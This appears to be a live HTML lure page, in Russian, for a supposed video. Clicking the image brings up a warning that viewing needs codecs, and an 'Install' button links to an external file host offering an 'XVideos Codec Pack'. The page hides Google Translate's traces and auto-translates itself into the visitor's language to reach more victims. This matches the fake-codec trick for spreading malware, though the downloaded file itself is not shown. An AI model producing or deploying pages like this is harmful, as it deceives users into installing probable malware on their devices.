<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Full Video Access</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: "Segoe UI Variable", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }

    img {
      max-width: 90vw;
      max-height: 90vh;
      cursor: pointer;
      user-select: none;
      -webkit-user-drag: none;
    }

    /* Модальное окно */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      align-items: center;
      justify-content: center;
      padding: 10px;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .modal.show {
      display: flex;
      opacity: 1;
    }

    .modal-content {
      background-color: #f3f3f3;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      padding: 25px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
      color: #000;
      font-size: 15px;
      transform: scale(0.8);
      transition: transform 0.3s ease;
    }

    .modal.show .modal-content {
      transform: scale(1);
    }

    .modal-content .icon {
      font-size: 60px;
      color: #d93025;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
      margin-bottom: 15px;
    }

    .modal-content p {
      margin: 0 0 20px 0;
      font-weight: 500;
    }

    .modal-buttons a {
      padding: 12px 28px;
      font-size: 15px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      text-decoration: none;
      color: #fff;
      background-color: #0078d4;
      display: inline-block;
      transition: background-color 0.2s, transform 0.1s;
    }

    .modal-buttons a:hover {
      background-color: #005a9e;
      transform: translateY(-1px);
    }

    .modal-buttons a:active {
      transform: translateY(1px);
    }

    /* Полное скрытие Google Translate */
    #google_translate_element,
    .goog-te-banner-frame,
    .goog-te-gadget-icon,
    #goog-gt-tt,
    .goog-te-balloon-frame,
    .goog-te-menu-frame,
    .goog-te-combo,
    .goog-te-spinner-pos,
    .goog-te-gadget,
    .goog-te-banner,
    .skiptranslate {
      display: none !important;
      visibility: hidden !important;
    }

    body {
      top: 0 !important; /* Убираем отступы после скрытия баннера */
    }
  </style>
</head>
<body>

  <!-- Картинка-триггер -->
  <img src="ai_bot.png" alt="AI Bot" id="trigger">

  <!-- Модальное окно -->
  <div class="modal" id="modal">
    <div class="modal-content">
      <div class="icon">⚠</div>
      <p id="modal-text">Для просмотра видео необходимо установить кодеки.</p>
      <div class="modal-buttons">
        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" 
           target="_blank" rel="noopener noreferrer">Установить</a>
      </div>
    </div>
  </div>

  <!-- Контейнер для Google Translate (скрыт) -->
  <div id="google_translate_element"></div>

  <script>
    const trigger = document.getElementById('trigger');
    const modal = document.getElementById('modal');

    // Показ модального окна
    trigger.addEventListener('click', () => {
      modal.classList.add('show');
    });

    // Автоматический выбор языка пользователя
    function googleTranslateElementInit() {
      new google.translate.TranslateElement({
        pageLanguage: 'ru',
        autoDisplay: false
      }, 'google_translate_element');

      const userLang = navigator.language || navigator.userLanguage;
      const langCode = userLang.split('-')[0];

      const interval = setInterval(() => {
        const select = document.querySelector('.goog-te-combo');
        if (select) {
          select.value = langCode;
          select.dispatchEvent(new Event('change'));
          clearInterval(interval);
        }
      }, 500);
    }

    // Закрытие модального окна по клавише Esc (опционально)
    document.addEventListener('keydown', (event) => {
      if (event.key === "Escape") {
        modal.classList.remove('show');
      }
    });
  </script>

  <!-- Скрипт перевода -->
  <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>
